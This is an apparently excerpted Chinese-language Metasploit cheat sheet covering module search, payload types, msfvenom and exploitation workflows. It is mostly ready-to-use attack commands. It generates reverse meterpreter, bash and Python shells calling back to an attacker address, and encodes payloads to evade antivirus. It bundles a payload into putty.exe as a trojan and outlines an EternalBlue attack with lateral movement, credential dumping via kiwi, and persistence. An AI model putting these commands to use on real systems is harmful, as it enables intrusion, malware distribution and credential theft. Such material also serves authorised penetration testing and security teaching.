### 1.2 搜索模块

```bash
# 按关键字搜索
search ms17-010
search eternalblue
search mysql
search tomcat

# 按类型搜索
search type:auxiliary mysql
search type:exploit windows
search type:post windows
search type:payload linux

# 按平台搜索
search platform:windows smb
search platform:linux tomcat
search platform:multi http

# 按评级搜索
search rank:excellent windows
search rank:great smb

# 组合搜索
search type:exploit platform:windows smb
search type:auxiliary platform:linux scanner

# 搜索结果说明：
#   # — 序号
#   Name — 模块名称
#   Disclosure Date — 披露日期
#   Rank — 评级
#   Check — 是否支持 check
#   Description — 描述
```

**模块评级（Rank）：**

| 评级 | 说明 | 可靠性 |
|------|------|--------|
| `excellent` | 极佳，几乎不会导致服务崩溃 | 最高 |
| `great` | 很好，可靠性高 | 高 |
| `good` | 良好，正常情况不会出问题 | 较高 |
| `normal` | 一般，可能导致问题 | 中 |
| `average` | 一般，可能导致服务崩溃 | 较低 |
| `low` | 低，可靠性差 | 低 |

### 3.4 Payload 类型说明

```
Staged（分阶段）：
  Stager（传输器）：
    - 小型 shellcode
    - 负责建立连接
    - 下载第二阶段 payload
  Stage（传输体）：
    - 完整 payload
    - 通过 Stager 下载执行
  示例：windows/meterpreter/reverse_tcp
  优点：体积小，适合注入空间有限的场景
  缺点：需要二次网络连接

Stageless（无阶段）：
  - 完整 payload 在一个文件中
  - 不需要二次下载
  示例：windows/meterpreter_reverse_tcp
  优点：减少网络特征，更隐蔽
  缺点：体积大

Bind（正向）：
  - 目标机监听端口
  - 攻击机连接目标
  适用：目标在内部网络，攻击机能直接访问

Reverse（反向）：
  - 攻击机监听端口
  - 目标机主动连接攻击机
  适用：目标有出网权限，或目标在 NAT 后
```

## 五、msfvenom 速查

### 5.1 基本语法

```bash
msfvenom -p <payload> [payload选项] -f <格式> -o <输出文件>

常用选项：
  -p, --payload       指定 payload
  -f, --format        输出格式
  -o, --out           输出文件
  -e, --encoder       编码器
  -i, --iterations    编码次数
  -n, --nopsled       NOP sled 长度
  -a, --arch          架构（x86/x64）
  --platform          平台（windows/linux）
  -b, --bad-chars     排除的坏字符
  -x, --template      模板文件
  -k, --keep          保留模板功能
  -l, --list          列出（payloads/encoders/formats）
```

### 5.2 Windows Payload 生成

```bash
# EXE - 32位 反向 TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f exe -o shell.exe

# EXE - 64位 反向 TCP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f exe -o shell64.exe

# EXE - 反向 HTTPS
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 \
         -f exe -o shell_https.exe

# DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f dll -o shell.dll

# Stageless（无阶段）
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f exe -o stageless.exe
```

### 5.3 Linux Payload 生成

```bash
# ELF - 32位
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f elf -o shell.elf

# ELF - 64位
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f elf -o shell64.elf

# 反向 Shell（Bash）
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.1 LPORT=4444 -f raw

# 反向 Shell（Python）
msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.1 LPORT=4444 -f raw
```

### 5.5 编码与免杀

```bash
# 列出所有编码器
msfvenom -l encoders

# 使用 shikata_ga_nai 编码（最经典）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# 多重编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -e x86/shikata_ga_nai -i 5 \
         -e x86/countdown -i 3 \
         -f exe -o multi_encoded.exe

# 模板注入（捆绑到合法程序）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -x putty.exe -k -f exe -o putty_trojan.exe

# 排除坏字符
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -b '\x00\x0a\x0d\xff' -f exe -o clean.exe

# 添加 NOP sled
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -n 20 -f exe -o with_nops.exe
```

## 九、常用操作流程速查

### 9.1 漏洞利用标准流程

```
1. 搜索模块
   search ms17-010

2. 使用模块
   use exploit/windows/smb/ms17_010_eternalblue

3. 查看选项
   show options

4. 设置参数
   set RHOSTS 192.168.1.100
   set LHOST 192.168.1.1
   set LPORT 4444

5. 设置 payload（可选，通常默认即可）
   set payload windows/x64/meterpreter/reverse_tcp

6. 检查目标（可选）
   check

7. 运行
   run
   exploit
   run -j  （后台运行）

8. 获取会话后操作
   sessions
   sessions -i 1
```

### 9.2 Handler 监听流程

```
1. 使用 handler 模块
   use exploit/multi/handler

2. 设置 payload
   set PAYLOAD windows/meterpreter/reverse_tcp

3. 设置监听地址和端口
   set LHOST 0.0.0.0
   set LPORT 4444

4. 后台运行
   run -j

5. 等待会话连入
   sessions

6. 进入会话
   sessions -i 1
```

### 9.3 内网渗透流程

```
1. 获得初始 Shell
   （通过 Web 漏洞、弱口令等）

2. 信息收集
   sysinfo
   getuid
   ipconfig
   run get_local_subnets

3. 添加路由
   background
   route add 192.168.10.0 255.255.255.0 1

4. 内网扫描
   use auxiliary/scanner/portscan/tcp
   set RHOSTS 192.168.10.0/24
   set THREADS 20
   run

5. 横向移动
   （Psexec、WMI、WinRM 等）

6. 权限提升
   getsystem
   或使用本地提权漏洞

7. 凭证收集
   load kiwi
   creds_all

8. 持久化
   run persistence ...
```
